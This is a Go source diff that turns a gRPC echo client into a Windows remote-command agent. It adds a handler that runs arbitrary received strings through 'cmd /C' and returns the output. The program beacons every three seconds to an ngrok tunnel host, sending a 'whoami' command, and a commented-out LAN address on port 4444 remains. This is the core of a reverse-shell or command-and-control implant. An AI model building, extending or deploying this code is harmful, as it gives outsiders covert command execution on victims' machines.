@@ -1,43 +1,62 @@
 package main
 
 import (
-	"bufio"
 	"context"
-	"fmt"
 	"log"
-	"os"
+	"os/exec"
 	"time"
 
 	"github.com/cardfaux/windows-connect/grpcapi"
 	"google.golang.org/grpc"
 )
 
+type clientServer struct {
+	grpcapi.UnimplementedEchoServiceServer
+}
+
+func (c *clientServer) ExecuteCommand(ctx context.Context, req *grpcapi.CommandRequest) (*grpcapi.CommandResponse, error) {
+	log.Printf("Executing command: %s", req.Command)
+
+	// Execute command
+	cmd := exec.Command("cmd", "/C", req.Command) // For Windows
+	output, err := cmd.CombinedOutput()
+
+	resp := &grpcapi.CommandResponse{
+		Output: string(output),
+	}
+	if err != nil {
+		resp.Error = err.Error()
+	}
+
+	return resp, nil
+}
+
 func main() {
-    //conn, err := grpc.Dial("192.168.0.151:4444", grpc.WithInsecure())
-		conn, err := grpc.Dial("6.tcp.ngrok.io:17905", grpc.WithInsecure())
-    if err != nil {
-        log.Fatalf("Failed to connect: %v", err)
-    }
-    defer conn.Close()
+	// Client connects to the gRPC server
+	conn, err := grpc.Dial("6.tcp.ngrok.io:17905", grpc.WithInsecure())
+	if err != nil {
+		log.Fatalf("Failed to connect: %v", err)
+	}
+	defer conn.Close()
 
-    client := grpcapi.NewEchoServiceClient(conn)
+	log.Println("Connected to command server.")
 
-    scanner := bufio.NewScanner(os.Stdin)
-    for {
-        fmt.Print("Enter message: ")
-        if !scanner.Scan() {
-            break
-        }
-        msg := scanner.Text()
+	// Register the service on the client side (this is a bit backward but allows a polling loop)
+	client := grpcapi.NewEchoServiceClient(conn)
 
-        ctx, cancel := context.WithTimeout(context.Background(), time.Second)
-        defer cancel()
+	// Keep polling the server for new commands (or implement streaming for better efficiency)
+	for {
+		time.Sleep(3 * time.Second) // polling delay
 
-        resp, err := client.Echo(ctx, &grpcapi.EchoRequest{Message: msg})
-        if err != nil {
-            log.Printf("Error calling Echo: %v", err)
-            continue
-        }
-        fmt.Printf("Response from server: %s\n", resp.GetReply())
-    }
+		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+		defer cancel()
+
+		resp, err := client.ExecuteCommand(ctx, &grpcapi.CommandRequest{Command: "whoami"}) // Replace this logic with server-sent commands
+		if err != nil {
+			log.Println("Command error:", err)
+			continue
+		}
+
+		log.Printf("Server response:\nOutput: %s\nError: %s\n", resp.Output, resp.Error)
+	}
 }
